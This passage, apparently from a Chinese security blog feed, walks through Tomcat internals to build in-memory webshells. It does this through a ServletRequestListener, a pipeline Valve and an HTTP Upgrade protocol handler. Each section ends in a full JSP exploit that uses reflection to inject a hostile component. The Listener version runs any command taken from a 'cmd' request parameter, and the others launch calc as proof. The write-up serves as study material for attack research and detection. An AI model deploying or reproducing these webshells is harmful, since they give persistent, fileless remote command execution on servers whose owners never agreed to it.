src="https://cdn.clown2024.cn/202409191156621.png" alt="image-20240919115656529"></p><p>然后就是到下面遍历触发我们定义的listener的requestInitialized()方法</p><p><img src="https://cdn.clown2024.cn/202409191200195.png" alt="image-20240919120033087"></p><p>到这里流程就结束，这部分看起来还是比较简单的</p><p>相对应的请求结束的时候就会调用fireRequestDestroyEvent方法</p><p><img src="https://cdn.clown2024.cn/202409191232040.png" alt="image-20240919120248808"></p><h2 id="内存马编写"><a href="#内存马编写-1" class="headerlink" title="内存马编写"></a>内存马编写</h2><p>通过上面的流程分析，exp的编写步骤也很简单：</p><p>就是通过 StandardContext 类的 <code>addApplicationEventListener()</code> 方法把恶意的 Listener实例放进去，然后恶意代码写在requestInitialized()方法里面即可</p><p>exp</p><figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;Title&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;%<br>    <span class="hljs-comment">//获取standardContext</span><br>    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br>    Field applicationContextField=servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    applicationContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) applicationContextField.get(servletContext);<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">standardContextField</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    standardContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) standardContextField.get(applicationContext);<br><br>    <span class="hljs-comment">//创建恶意listener</span><br>    <span class="hljs-type">ServletRequestListener</span> <span class="hljs-variable">servletRequestListener</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletRequestListener</span>()&#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestDestroyed</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>            <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> (HttpServletRequest) sre.getServletRequest();<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    Runtime.getRuntime().exec(cmd);<br>                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                    e.printStackTrace();<br>                &#125; <span class="hljs-keyword">catch</span> (NullPointerException n) &#123;<br>                    n.printStackTrace();<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestInitialized</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br><br>        &#125;<br>    &#125;;<br>    <span class="hljs-comment">//添加监听器</span><br>    standardContext.addApplicationEventListener(servletRequestListener);<br>%&gt;<br><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>然后美美白屏弹计算器</p><p><img src="https://cdn.clown2024.cn/202409191342329.png" alt="image-20240919134253239"></p><p><img src="https://cdn.clown2024.cn/202409191342142.png" alt="image-20240919134258008"></p><blockquote><p>这里我认为是并没有相关路径的匹配逻辑，所以不需要在访问前的那部分注册</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这里是本菜鸡开始学习内存马的起始文章&lt;/p&gt;
&lt;p&gt;有关内存马的认知可以看看su18师傅的这篇文章：&lt;a href=&quot;https://mp.weixin.qq.com/s/NKq4BZ8fLK7bsGSK5UhoGQ&quot;&gt;https://mp.weixin.qq.com/s/</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
    <category term="内存马" scheme="https://clowsman.github.io/tags/%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    
  </entry>
  
  <entry>
    <title>Tomcat中间件内存马</title>
    <link href="https://clowsman.github.io/2024/09/14/Tomcat%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <id>https://clowsman.github.io/2024/09/14/Tomcat%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%86%85%E5%AD%98%E9%A9%AC/</id>
    <published>2024-09-14T12:54:29.000Z</published>
    <updated>2024-09-27T14:53:07.569Z</updated>
    
    <content type="html"><![CDATA[<p>其实前面的传统web应用内存马也是tomcat这部分的，因为它基于tomcat进行分析不过问题不大，别的中间件应该也是有这些基本组件的。</p><h1 id="tomcat-valve内存马"><a href="#Tomcat-Valve内存马" class="headerlink" title="Tomcat-Valve内存马"></a>Tomcat-Valve内存马</h1><p>valve就是前面文章中说过的阀门，也就是pipeline(管道)机制，想了解得更加细致一点可以看看这篇文章：<a href="https://www.cnblogs.com/coldridgeValley/p/5816414.html%EF%BC%8C%E4%B9%9F%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%89%8D%E6%96%87%E6%8F%90%E5%88%B0%E7%9A%84%E6%80%BB%E7%BB%93%E5%A4%A7%E5%85%A8%E6%96%87%E7%AB%A0%E3%80%82">https://www.cnblogs.com/coldridgeValley/p/5816414.html，也可以看前文提到的总结大全文章。</a></p><p>这里放一张Valve的运行机制图</p><p><img src="https://cdn.clown2024.cn/202409211418602.png" alt="image-20240921141822546"></p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>经过前面的学习，现在分析起来还是比较简单的，这里就不自己配一个valve了，因为valve属于容器，需要在server.xml或者context.xml那里配置，看看文章就行，或者像文章里直接用springboot来搭建。</p><blockquote><p>Pipeline定义对应的接口是Pipeline，他的实现类是StandardPipeline，Valve定义对应接口Valve，他的抽象实现类是ValveBase，然后四个容器本身有的阀门为StandardEngineValve，StandardHostValve，StandardContextValve，StandardWrapperValve。</p></blockquote><p>这里直接看源码分析</p><p><img src="https://cdn.clown2024.cn/202409211514128.png" alt="image-20240921151457990"></p><p>我们在访问filter的时候可以从调用栈看到很多的valve，我们可以去看一下这些wrapperValve</p><p><img src="https://cdn.clown2024.cn/202409211518432.png" alt="image-20240921151844389"></p><p>可以看到继承的是ValveBase这个类，这个类是一个抽象类，然后它又实现了Valve接口，看一下Valve接口有什么，直接copy一下文章的内容，因为他加了注释</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.apache.catalina;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> org.apache.catalina.connector.Request;<br><span class="hljs-keyword">import</span> org.apache.catalina.connector.Response;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Valve</span> &#123;<br>    <span class="hljs-comment">// 获取下一个阀门</span><br>    <span class="hljs-keyword">public</span> Valve <span class="hljs-title function_">getNext</span><span class="hljs-params">()</span>;<br>    <span class="hljs-comment">// 设置下一个阀门</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setNext</span><span class="hljs-params">(Valve valve)</span>;<br>    <span class="hljs-comment">// 后台执行逻辑，主要在类加载上下文中使用到</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">backgroundProcess</span><span class="hljs-params">()</span>;<br>    <span class="hljs-comment">// 执行业务逻辑</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span><br>        <span class="hljs-keyword">throws</span> IOException, ServletException;<br>    <span class="hljs-comment">// 是否异步执行</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isAsyncSupported</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后我们可以看一下每一级的Valve是怎么调用的</p><p><img src="https://cdn.clown2024.cn/202409211533484.png" alt="image-20240921153326414"></p><p>在Host调用Context的</p><p><img src="https://cdn.clown2024.cn/202409211533055.png" alt="image-20240921153355996"></p><p>在Context调用Wrapper的</p><p>然后我们重新下断点从context.getPipeline开始看，利用点从这里开始，因为我们好获取的就是context</p><p><img src="https://cdn.clown2024.cn/202409211538211.png" alt="image-20240921153810150"></p><p>这里会走到父类的ContainerBase的getPipeline方法，ContainerBase是所有容器的抽象父类</p><p><img src="https://cdn.clown2024.cn/202409211539334.png" alt="image-20240921153916289"></p><p>然后我们去看看这个pipeline</p><p><img src="https://cdn.clown2024.cn/202409211540918.png" alt="image-20240921154014879"></p><p>是一个StandardPipeline类，也就是我们前面说过的Pipeline的实现类</p><p><img src="https://cdn.clown2024.cn/202409211541679.png" alt="image-20240921154104632"></p><p>看看Pipeline的接口方法</p><p><img src="https://cdn.clown2024.cn/202409211541979.png" alt="image-20240921154142926"></p><p>可以看到有addVavle方法，那么StandardPipeline就有相应的实现方法</p><p><img src="https://cdn.clown2024.cn/202409211543271.png" alt="image-20240921154312200"></p><p>那我们打内存马的思路就出来了</p><p>我们只需要利用context.getPipeline然后addVavle进去一个我们自己写的恶意valve即可</p><h2 id="内存马编写"><a href="#内存马编写" class="headerlink" title="内存马编写"></a>内存马编写</h2><p>exp</p><figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Pipeline&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Valve&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;Title&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;%<br>    <span class="hljs-comment">//1.获取standardContext</span><br>    <span class="hljs-comment">//获取ApplicationContext</span><br>    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br>    Field applicationContextField=servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    applicationContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) applicationContextField.get(servletContext);<br>    <span class="hljs-comment">//获取StandardContext</span><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">standardContextField</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    standardContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) standardContextField.get(applicationContext);<br><br>    <span class="hljs-comment">//获取Pipeline</span><br>    <span class="hljs-type">Pipeline</span> <span class="hljs-variable">pipeline</span> <span class="hljs-operator">=</span> standardContext.getPipeline();<br>    <span class="hljs-comment">//添加恶意Valve</span><br>    pipeline.addValve(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Valve</span>() &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> Valve <span class="hljs-title function_">getNext</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setNext</span><span class="hljs-params">(Valve valve)</span> &#123;<br><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">backgroundProcess</span><span class="hljs-params">()</span> &#123;<br><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>            <span class="hljs-comment">//恶意代码</span><br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isAsyncSupported</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;);<br>%&gt;<br><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>然后就能白屏弹计算器</p><p><img src="https://cdn.clown2024.cn/202409211550418.png" alt="image-20240921155025355"></p><p><img src="https://cdn.clown2024.cn/202409211550385.png" alt="image-20240921155045287"></p><p>在这篇文章看到一个更简单的获取standardContext的方法：<a href="https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Valve%E5%9E%8B/">https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Valve%E5%9E%8B/</a></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 更简单的方法 获取StandardContext  </span><br> <span class="hljs-type">Field</span> <span class="hljs-variable">reqF</span> <span class="hljs-operator">=</span> request.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);  <br> reqF.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">Request</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (Request) reqF.get(request);  <br> <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) req.getContext(); <br></code></pre></td></tr></table></figure><h1 id="tomcat-upgrade内存马"><a href="#Tomcat-Upgrade内存马" class="headerlink" title="Tomcat-Upgrade内存马"></a>Tomcat-Upgrade内存马</h1><h2 id="原理分析"><a href="#原理分析-1" class="headerlink" title="原理分析"></a>原理分析</h2><p>这里参考文章：<a href="https://mp.weixin.qq.com/s/RuP8cfjUXnLVJezBBBqsYw">https://mp.weixin.qq.com/s/RuP8cfjUXnLVJezBBBqsYw</a></p><p>放一张文章的连接器图</p><p><img src="https://cdn.clown2024.cn/202409222103688.webp" alt="图片"></p><p>该内存马就是在到达Container之前的利用，因为可能会由于Filter的过滤或者反代导致我们找不到路径，导致我们的利用Container内组件的内存马无法使用</p><p>首先抽象类<strong>AbstractProcessorLight</strong>的process方法中，会根据当前<code>SocketWrapperBase</code>的状态进行响应，在<code>OPEN_READ</code>状态时，会调用对应的<code>Processor</code>的service方法进行处理</p><p><img src="https://cdn.clown2024.cn/202409222122170.png" alt="image-20240922212210064"></p><p>这里Http请求调用的就是Http11Processor#service，然后它里面有处理Upgrade的逻辑</p><p><img src="https://cdn.clown2024.cn/202409222127551.png" alt="image-20240922212744457"></p><p>这里的protocol是Http11NioProtocol，看一下他的getUpgradeProtocol方法</p><p><img src="https://cdn.clown2024.cn/202409222129320.png" alt="image-20240922212924262"></p><p>这里走到的是父类的方法，可以看到就是返回一个UpgradeProtocol，httUpgradeProtocols是一个hashMap；获取了upgradeProtocol之后，它下面还调用了他的accept方法</p><p>欸那这里内存马的思路就出来了，和之前的也很类似</p><p>首先这个UpgradeProtocol是一个接口</p><p><img src="https://cdn.clown2024.cn/202409222140816.png" alt="image-20240922214008767"></p><p>那么我们只要构造一个恶意的UpgradeProtocol的实现类，添加进我们前面的提到的httpUpgradeProtocols里面即可</p><p>那么现在就是要找这个httpUpgradeProtocols怎么获取，这里先跟文章看看httpUpgradeProtocols是哪里被赋值的</p><p><img src="https://cdn.clown2024.cn/202409222144324.png" alt="image-20240922214420260"></p><p>在AbstractHttp11Protocol#init方法里面对upgradeProtocols进行了遍历，然后调用了configureUpgradeProtocol方法</p><p><img src="https://cdn.clown2024.cn/202409222146364.png" alt="image-20240922214605304"></p><p>然后该方法upgradeProtocol添加到hashMap中</p><blockquote><p>upgradeProtocols是在tomcat启动的时候进行初始化</p></blockquote><h2 id="内存马编写"><a href="#内存马编写-1" class="headerlink" title="内存马编写"></a>内存马编写</h2><p>第一步先找到Http11NioProtocol，我们可以在<strong>request.request.connector.protocolHandler</strong>中找到</p><p><img src="https://cdn.clown2024.cn/202409222151834.png" alt="image-20240922215129782"></p><p><img src="https://cdn.clown2024.cn/202409222151796.png" alt="image-20240922215134740"></p><p>然后httpUpgradeProtocols属性就在里面，我们需要用反射去获取，我看了一下没有直接get的方法</p><p>第二步就是编写恶意的UpgradeProtocol了</p><p><strong>exp</strong></p><figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.RequestFacade&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Connector&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.coyote.http11.AbstractHttp11Protocol&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.coyote.UpgradeProtocol&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.HashMap&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.coyote.Processor&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.net.SocketWrapperBase&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.coyote.Adapter&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;Title&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;%<br>    <span class="hljs-comment">//1.反射获取httpUpgradeProtocols</span><br>    <span class="hljs-type">RequestFacade</span> <span class="hljs-variable">rf</span> <span class="hljs-operator">=</span> (RequestFacade) request;<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">requestField</span> <span class="hljs-operator">=</span> RequestFacade.class.getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);<br>    requestField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Request</span> <span class="hljs-variable">request1</span> <span class="hljs-operator">=</span> (Request) requestField.get(rf);<br><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">connector</span> <span class="hljs-operator">=</span> Request.class.getDeclaredField(<span class="hljs-string">&quot;connector&quot;</span>);<br>    connector.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Connector</span> <span class="hljs-variable">realConnector</span> <span class="hljs-operator">=</span> (Connector) connector.get(request1);<br><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">protocolHandlerField</span> <span class="hljs-operator">=</span> Connector.class.getDeclaredField(<span class="hljs-string">&quot;protocolHandler&quot;</span>);<br>    protocolHandlerField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">AbstractHttp11Protocol</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (AbstractHttp11Protocol) protocolHandlerField.get(realConnector);<br><br>    HashMap&lt;String, UpgradeProtocol&gt; upgradeProtocols = <span class="hljs-literal">null</span>;<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">upgradeProtocolsField</span> <span class="hljs-operator">=</span> AbstractHttp11Protocol.class.getDeclaredField(<span class="hljs-string">&quot;httpUpgradeProtocols&quot;</span>);<br>    upgradeProtocolsField.setAccessible(<span class="hljs-literal">true</span>);<br>    upgradeProtocols = (HashMap&lt;String, UpgradeProtocol&gt;) upgradeProtocolsField.get(handler);<br>    <span class="hljs-comment">//2.构造恶意的UpgradeProtocol</span><br>    <span class="hljs-type">UpgradeProtocol</span> <span class="hljs-variable">upgradeProtocol</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UpgradeProtocol</span>() &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getHttpUpgradeName</span><span class="hljs-params">(<span class="hljs-type">boolean</span> isSSLEnabled)</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] getAlpnIdentifier() &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">0</span>];<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getAlpnName</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> Processor <span class="hljs-title function_">getProcessor</span><span class="hljs-params">(SocketWrapperBase&lt;?&gt; socketWrapper, Adapter adapter)</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> InternalHttpUpgradeHandler <span class="hljs-title function_">getInternalUpgradeHandler</span><span class="hljs-params">(Adapter adapter, org.apache.coyote.Request request)</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">accept</span><span class="hljs-params">(org.apache.coyote.Request request)</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;;<br>    <span class="hljs-comment">//3.添加进upgradeProtocols</span><br>    upgradeProtocols.put(<span class="hljs-string">&quot;clown&quot;</span>,upgradeProtocol);<br>%&gt;<br><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>然后访问的时候带上upgrade</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Upgrade: clown<br>Connection: Upgrade<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409222209433.png" alt="image-20240922220915371"></p><p><img src="https://cdn.clown2024.cn/202409222210497.png" alt="image-20240922221016377"></p><p>成功弹计算器</p><h1 id="tomcat-executor内存马"><a href="#Tomcat-Executor内存马" class="headerlink" title="Tomcat-Executor内存马"></a>Tomcat-Executor内存马</h1><p>参考文章：<a href="https://mp.weixin.qq.com/s/cU2s8D2BcJHTc7IuXO-1UQ">https://mp.weixin.qq.com/s/cU2s8D2BcJHTc7IuXO-1UQ</a></p><h2 id="执行流程分析"><a href="#执行流程分析" class="headerlink" title="执行流程分析"></a>执行流程分析</h2><p>这里临时插入重新分析一下Connector的流程，因为有点乱，导致我后面看Executor内存马会有点混乱</p><p><strong>服务的启动时</strong></p><p>这里就说一下各个类的初始化的顺序，从StandardService的初始化方法开始</p><p><img src="https://cdn.clown2024.cn/202409262315547.png" alt="image-20240926231523449"></p><blockquote><p>图只是参考，具体方法不一定对，因为是别人画的图，可能tomcat版本不一样方法名会有差异，这里按照的是我自己的版本分析</p></blockquote><p>StandardService#initInternal</p><p><img src="https://cdn.clown2024.cn/202409262320249.png" alt="image-20240926232011146"></p><p>这里执行了图中的三个init方法，重点看init方法，这里有executor.init()方法，但是此时executors数组为空所以没有执行，应该是在后面有请求的时候放入</p><p>这个connector是Connector类，然后init去到了父类LifecycleBase的init方法</p><p><img src="https://cdn.clown2024.cn/202409262327581.png" alt="image-20240926232630314"></p><p>然后再调用initInternal方法回到Connector</p><p><img src="https://cdn.clown2024.cn/202409262328153.png" alt="image-20240926232843081"></p><p>然后调用Http11NioProtocol#setAdapter设置一个adapter</p><p>然后往下调用了protocolHandler#init()方法</p><p><img src="https://cdn.clown2024.cn/202409262329171.png" alt="image-20240926232959094"></p><p>然后又走到父类AbstractHttp11Protocol的init方法</p><p><img src="https://cdn.clown2024.cn/202409262331554.png" alt="image-20240926233137474"></p><p>然后又掉用父类的AbstractProtocol的init方法</p><p><img src="https://cdn.clown2024.cn/202409262332748.png" alt="image-20240926233241664"></p><p>里面又调用NioEndpoint的init方法</p><p>然后又是走到父类AbstractJsseEndpoint的init方法</p><p><img src="https://cdn.clown2024.cn/202409262334655.png" alt="image-20240926233401589"></p><p>然后又调用父类的AbstractEndpoint的init方法</p><p><img src="https://cdn.clown2024.cn/202409262335562.png" alt="image-20240926233521470"></p><p>这里的bind方法就是调用NioEndpoint的bind方法来起一个socket服务监听端口了</p><p><img src="https://cdn.clown2024.cn/202409262336888.png" alt="image-20240926233650811"></p><p>默认的acceptCount是100，然后这就是大概的流程</p><p>顺便提一下，一开始的connector是有两个的，如下：</p><p><img src="https://cdn.clown2024.cn/202409262352133.png" alt="image-20240926235226049"></p><p><strong>接受请求后的分析</strong></p><p>这里就分析到Executor的位置，因为这是临时插入的下面已经写好了懒得动了😢</p><p>前面文章说到，接受了请求之后会传递给setSocketOptions方法</p><p><img src="https://cdn.clown2024.cn/202409270008999.png" alt="image-20240927000803914"></p><p>然后这里获取了Poller注册了channel</p><p><img src="https://cdn.clown2024.cn/202409270009941.png" alt="image-20240927000918856"></p><p>然后这个Poller也是实现了Runnable接口的，那后面就会走到他的run方法里面，我们看一下</p><p><img src="https://cdn.clown2024.cn/202409270011717.png" alt="image-20240927001157616"></p><p>然后processKey里面又会走到一个processSocket方法</p><p><img src="https://cdn.clown2024.cn/202409270012045.png" alt="image-20240927001244969"></p><p>然后就会走到我们要重点关注的<strong>executor.execute</strong>方法</p><p><img src="https://cdn.clown2024.cn/202409270013273.png" alt="image-20240927001342167"></p><blockquote><p>大概就是这样，但是调试的时候有时候流程还是会变得很怪，尤其是中间跳到Executor那一块，调的并不是很明白</p></blockquote><h2 id="原理分析"><a href="#原理分析-2" class="headerlink" title="原理分析"></a>原理分析</h2><p>参考文章：<a 